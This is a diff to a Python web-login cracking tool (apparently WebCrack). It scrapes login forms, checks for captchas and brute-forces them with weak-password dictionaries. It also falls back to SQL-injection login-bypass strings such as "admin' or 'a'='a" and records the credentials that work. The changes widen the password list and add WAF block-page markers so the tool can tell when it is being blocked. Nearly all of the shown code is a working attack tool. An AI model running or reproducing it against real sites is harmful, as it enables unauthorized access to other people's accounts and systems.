@@ -3,10 +3,7 @@ type: python3
 author: yzddmr6
 github: https://github.com/yzddmr6/WebCrack
 link: https://yzddmr6.tk/posts/webcrack-release/
-
 '''
-
-
 
 import time, requests, os, sys, re
 import random, urllib
@@ -14,6 +11,7 @@ import datetime
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 from bs4 import BeautifulSoup as BS
+from urllib.parse import urlparse
 import json
 
 author_info = '''
@@ -27,7 +25,7 @@ author_info = '''
 log_file = 'web_crack_log.txt'
 oklog_file = 'web_crack_ok.txt'
 
-exp_user_dic = ["admin' or 'a'='a", "'or'='or'", "admin' or '1'='1' or 1=1", "')or('a'='a", "'or 1=1--"]
+exp_user_dic = ["admin' or 'a'='a", "'or'='or'", "admin' or '1'='1' or 1=1", "')or('a'='a", "'or 1=1 -- -"]
 exp_pass_dic = exp_user_dic
 
 with open('cms.json','r',encoding="utf-8") as config:
@@ -35,12 +33,14 @@ with open('cms.json','r',encoding="utf-8") as config:
     cms=json.loads(data)
     kind_num=len(cms)
 
+def gettime():
+    return time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
 def mix_dic(url):
     mix_user_dic = ['admin']
     mix_pass_dic = []
-    static_pass_dic = ['{user}', '123456', '{user}888', '12345678', '123123',  '88888888','888888',
-                       '{user}123', '{user}123456', '{user}666', '123456789', '654321', '666666','66666666',
-                       '1234567890', '8888888', '987654321','0123456789', '12345', '1234567']
+    static_pass_dic = ['{user}', '123456', '{user}888', '12345678', '123123',  '88888888','888888','password','123456a',
+                       '{user}123', '{user}123456', '{user}666','{user}2018', '123456789', '654321', '666666','66666666',
+                       '1234567890', '8888888', '987654321','0123456789', '12345', '1234567','000000','111111','5201314','123123']
     mix_pass_dic = gen_dynam_dic(url)
     static_pass_dic.extend(mix_pass_dic)
     return mix_user_dic, static_pass_dic
@@ -81,8 +81,8 @@ def gen_dynam_dic(url):
 
 def requests_proxies():
     proxies = {
-        # 'http':'127.0.0.1:8080',
-        # 'https':'127.0.0.1:8080'
+    #    'http':'127.0.0.1:8080',
+    #    'https':'127.0.0.1:8080'
     }
     return proxies
 
@@ -121,22 +121,23 @@ def recheck(path, data, user_name, pass_word):
     conn = requests.session()
     pass_word = str(pass_word.replace('{user}', user_name))
 
-    data_test = str(data1.replace('%7Buser_name%7D', user_name))
+    data_test = str(data1.replace('%7Buser_name%7D', 'admin'))
     data_test = str(data_test.replace('%7Bpass_word%7D', 'length_test'))
 
     data2 = str(data1.replace('%7Buser_name%7D', user_name))
     data2 = str(data2.replace('%7Bpass_word%7D', pass_word))
-
-    res_01 = conn.post(url=path, data=data_test, headers=random_headers(), timeout=10, verify=False,
-                       allow_redirects=False, proxies=requests_proxies())
-    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
-                       allow_redirects=False, proxies=requests_proxies())
+    res_test = conn.post(url=path, data=data_test, headers=random_headers(), timeout=20, verify=False,
+                       allow_redirects=True, proxies=requests_proxies())#预请求
+    res_01 = conn.post(url=path, data=data_test, headers=random_headers(), timeout=20, verify=False,
+                       allow_redirects=True, proxies=requests_proxies())
+    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
+                       allow_redirects=True, proxies=requests_proxies())
     res_01.encoding = res_01.apparent_encoding
     res_02.encoding = res_02.apparent_encoding
     error_length_01 = len(res_01.text+str(res_01.headers))
     error_length_02 = len(res_02.text+str(res_02.headers))
 
-    if error_length_01 == error_length_02:
+    if error_length_01 == error_length_02  or res_02.status_code == 403:
         return 0
     else:
         return 1
@@ -145,29 +146,32 @@ def recheck(path, data, user_name, pass_word):
 def get_post_path(content, url):
     form_action = str(content).split('\n')[0]
     soup = BS(form_action, "lxml")
-    url_path = ''
-    for i in re.findall(".*?/", url):
-        url_path = url_path + i
+    res=urlparse(url)
+    path=''
+    action_path=soup.form['action']
 
-    action_url = soup.form['action']
-    if str(action_url).startswith('http'):
-        path = action_url
+    if action_path.startswith('http'):
+        path=action_path
+    elif action_path.startswith('/'):
+        root_path=res.scheme+'://'+res.netloc
+        path=root_path+action_path
     else:
-        path = url_path + '/' + soup.form['action']
+        relative_path=url.rstrip(url.split('/')[-1])
+        path=relative_path+action_path
     return path
 
 
 def get_form(url):
     url1 = url.strip()
     header = random_headers()
-    res = requests.get(url1, timeout=10, verify=False, headers=header)
+    res = requests.get(url1, timeout=20, verify=False, headers=header)
     res.encoding = res.apparent_encoding
     html = res.text
     cms_id =get_cms_kind(html)
     all_soup = BS(html, "lxml")
     captchas = ['验证码', '验 证 码','点击更换', '点击刷新','看不清','认证码','安全问题']
     if cms_id  and  cms[cms_id]['captcha'] == 1:
-        print("[-] captcha in login page: " + url + '\n',time.strftime('%Y-%m-%d %X', time.localtime(time.time())))
+        print("[-] captcha in login page: " + url + '\n',gettime())
         with open(log_file, 'a+') as log:
             log.write("[-] captcha in login page: "  + url + '\n')
         return '','',''
@@ -175,7 +179,7 @@ def get_form(url):
         if not cms_id :
             for captcha in captchas:
                 if captcha in html:
-                    print("[-]" + captcha + " in login page: " + url + '\n',time.strftime('%Y-%m-%d %X', time.localtime(time.time())))
+                    print("[-]" + captcha + " in login page: " + url + '\n',gettime())
                     with open(log_file, 'a+') as log:
                         log.write("[-]" + captcha + " in login page: " + url + '\n')
                     return '','',''
@@ -234,36 +238,32 @@ def get_data(url, content):
         for r in list(data.keys()):
             if i in r.lower():
                 data.pop(r)
-
+    if user_key and  pass_key :
+        return user_key, pass_key, str(urllib.parse.urlencode(data))
     else:
-        return user_key,pass_key,str(urllib.parse.urlencode(data))
-
+        return False, False, False
 
 def get_error_length(conn, path, data):
     data1 = data
-    cookie_error_flag = 0
     dynamic_req_len = 0
     data2 = str(data1.replace('%7Buser_name%7D', 'admin'))
     data2 = str(data2.replace('%7Bpass_word%7D', 'length_test'))
-    res_test = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
+    res_test = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                        allow_redirects=True, proxies=requests_proxies())#先请求一次
-    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
+    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                        allow_redirects=True, proxies=requests_proxies())
     res_02.encoding = res_02.apparent_encoding
-    res = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False, allow_redirects=True,
+    res = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False, allow_redirects=True,
                     proxies=requests_proxies())
     res.encoding = res.apparent_encoding
     error_length_02 = len(res_02.text+str(res_02.headers))
     error_length = len(res.text+str(res.headers))
     if error_length_02 != error_length:
         dynamic_req_len = 1
-    if 'Set-Cookie' in res.headers:
-        cookie_error_flag = 1
-    return error_length, cookie_error_flag, dynamic_req_len
-
+    return error_length, dynamic_req_len
 
 def confirm_login_page(url):
-    form_content, title,cms_id = get_form(url)   #title暂时没用
+    form_content, title,cms_id = get_form(url)
     search_flag = ['检索', '搜', 'search', '查找', 'keyword', '关键字']
     for i in search_flag:
         if i in form_content:
@@ -280,9 +280,9 @@ def confirm_login_page(url):
                 login_flag = 1
                 break
         if login_flag == 0:
-            print("[-] Mayme not login pages:", url)
+            print("[-] Maybe not login pages:", url)
             with open(log_file, 'a+') as log:
-                log.write("[-] Mayme not login pages:"+url+ '\n')
+                log.write("[-] Maybe not login pages:"+url+ '\n')
             form_content = ''
     return form_content,cms_id
 
@@ -308,7 +308,7 @@ def web_crack_task(url):
         if form_content:
             user_key,pass_key,data = get_data(url, form_content)
             if data:
-                print("Checking :", url,time.strftime('%Y-%m-%d %X', time.localtime(time.time())))
+                print("Checking :", url,gettime())
                 path= get_post_path(form_content, url)
                 user_dic, pass_dic = mix_dic(url)
                 user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)
@@ -320,7 +320,7 @@ def web_crack_task(url):
                     if exp_able:
                         user_dic=exp_user_dic
                         pass_dic=exp_pass_dic
-                        print('Exp_dic is trying')
+                        print('启动万能密码爆破模块')
                         user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)
                         if user_name:
                             print("Rechecking......",url, user_name, pass_word)
@@ -332,14 +332,14 @@ def web_crack_task(url):
                     
                 if recheck_flag:
                     with open(log_file, 'a+') as log:
-                        log.write("[+] Success url:" + url + '          ' + user_name + '/' + pass_word + '\n')
+                        log.write("[+] Success :" + url + '          ' + user_name + '/' + pass_word + '\n')
                     with open(oklog_file, 'a+') as oklog:
-                        oklog.write(url + '\t        ' + user_name + '/' + pass_word + '\n')
-                    print("[+] Success url:", url, " user/pass", user_name+ '/' + pass_word)
+                        oklog.write(url + '          ' + user_name + '/' + pass_word + '\n')
+                    print("[+] Success :", url, " user/pass", user_name+ '/' + pass_word)
                 else:
-                    print("[-] Faild url:", url,time.strftime('%Y-%m-%d %X', time.localtime(time.time())))
+                    print("[-] Faild :", url,gettime())
                     with open(log_file, 'a+') as log:
-                        log.write("[-] Faild url:"+url+ '\n')
+                        log.write("[-] Faild :"+url+ '\n')
     except Exception as e:
         start = datetime.datetime.now()
         with open('web_crack_error.txt', 'a+') as error_log:
@@ -350,7 +350,7 @@ def web_crack_task(url):
 def crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id):
     try:
         conn = requests.session()
-        error_length, cookie_error_flag, dynamic_req_len = get_error_length(conn, path, data)
+        error_length, dynamic_req_len = get_error_length(conn, path, data)
         if dynamic_req_len:
             return False, False
         num = 0
@@ -358,9 +358,9 @@ def crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id):
         dic_all = len(user_dic) * len(pass_dic)
         if not dic_all:
             return False, False
-        fail_words = ['密码错误', '重试', '不正确', '密码有误','不成功', '重新输入', 'history.back', '不存在', '登录失败', '登陆失败','出错',
-                        '已被锁定','history.go','安全拦截','还可以尝试','无效','攻击行为','创宇盾',
-                        '非法','百度云加速','安全威胁','防火墙','黑客', '不合法','warning.asp?msg=','Denied']            
+        fail_words = ['密码错误', '重试', '不正确', '密码有误','不成功', '重新输入', '不存在', '登录失败', '登陆失败','密码或安全问题错误','history.go','history.back',
+                        '已被锁定','安全拦截','还可以尝试','无效','攻击行为','创宇盾','http://zhuji.360.cn/guard/firewall/stopattack.html','D盾_拦截提示','用户不存在',
+                        '非法','百度云加速','安全威胁','防火墙','黑客', '不合法','Denied','尝试次数','http://safe.webscan.360.cn/stopattack.html']            
         for user_name in user_dic:
             for pass_word in pass_dic:
                 right_pass = 1
@@ -371,8 +371,9 @@ def crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id):
                 num = num + 1
                 #print('URL: ',path,"字典总数：", dic_all, " 当前尝试：", num, " checking:", user_name, pass_word)
                 print("字典总数：", dic_all, " 当前尝试：", num, " checking:", user_name, pass_word)
-                res = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
+                res = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                                 allow_redirects=True, proxies=requests_proxies())
+                #time.sleep(0.5)
                 res.encoding = res.apparent_encoding
                 html=res.text+str(res.headers)
                 if cms_id and cms[cms_id]['success_flag']:
@@ -413,7 +414,7 @@ def crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id):
 if __name__ == "__main__":
     print(author_info)
     url_file_name = input('File or Url:\n')
-    now = time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
+    now = gettime()
     try:
         if '://' in url_file_name:
             web_crack_task(url_file_name)
